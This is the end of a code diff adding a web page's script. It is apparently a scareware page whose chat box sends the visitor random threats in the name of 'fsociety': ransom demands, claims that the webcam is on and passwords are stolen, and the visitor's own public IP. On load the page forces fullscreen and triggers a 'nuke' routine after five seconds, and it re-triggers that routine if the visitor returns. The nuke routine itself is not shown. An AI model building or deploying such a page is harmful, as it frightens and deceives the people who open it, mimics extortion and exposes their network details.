+  if (!msg) return;
+  const userMsg = document.createElement('p');
+  userMsg.innerHTML = '<strong>You:</strong> ' + msg;
+  box.appendChild(userMsg);
+  input.value = '';
+  box.scrollTop = box.scrollHeight;
+  setTimeout(() => {
+    const replies = ['Pay the ransom and we will send the key.','No negotiation.','You have limited time.','We are watching your every move.','Do not try to be a hero.','Your webcam is on. Smile.','We already have your passwords.','Nice IP you got there. ' + (spyData.pubIp || ''),'Kamu sudah coba kabur ' + nukeAttempts + ' kali. Sia-sia.'];
+    const reply = document.createElement('p');
+    reply.style.color = '#c0392b';
+    reply.innerHTML = '<strong>fsociety:</strong> ' + replies[Math.floor(Math.random()*replies.length)];
+    box.appendChild(reply);
+    box.scrollTop = box.scrollHeight;
+  }, 1000);
+}
+document.getElementById('chatInput')?.addEventListener('keypress', function(e) { if (e.key === 'Enter') sendChat(); });
+
+// =====================================================
+//  START
+// =====================================================
+window.addEventListener('load', () => {
+  goFullscreen();
+  logPayload("Sistem siap");
+
+  if (localStorage.getItem('nuke_pending') === 'true') {
+    triggerNuke('Kamu balik setelah kabur');
+    localStorage.removeItem('nuke_pending');
+  }
+
+  setTimeout(() => { if (!nukeActive) triggerNuke('Auto-trigger setelah load'); }, 5000);
+});
+</script>
+</body>
+</html>
